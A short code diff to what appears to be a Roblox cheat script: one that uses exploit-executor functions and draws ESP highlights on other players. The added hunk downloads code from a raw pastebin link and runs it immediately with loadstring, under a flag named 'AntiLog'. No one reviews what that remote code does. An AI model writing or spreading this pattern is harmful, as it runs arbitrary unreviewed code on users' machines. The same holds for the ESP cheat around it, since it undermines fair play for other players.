@@ -26,6 +26,13 @@ elseif gethui then
   Folder.Parent = gethui()
 end
 
+if hookfunction then
+  if not _G.AntiLogEnabled then
+    loadstring(game:HttpGet('https://pastebin.com/raw/444k40vk'))();
+    _G.AntiLogEnabled = true
+  end
+end
+
 function esp(target, color)
   if not highlights[target] then
     local highlight = Instance.new("Highlight", Folder)
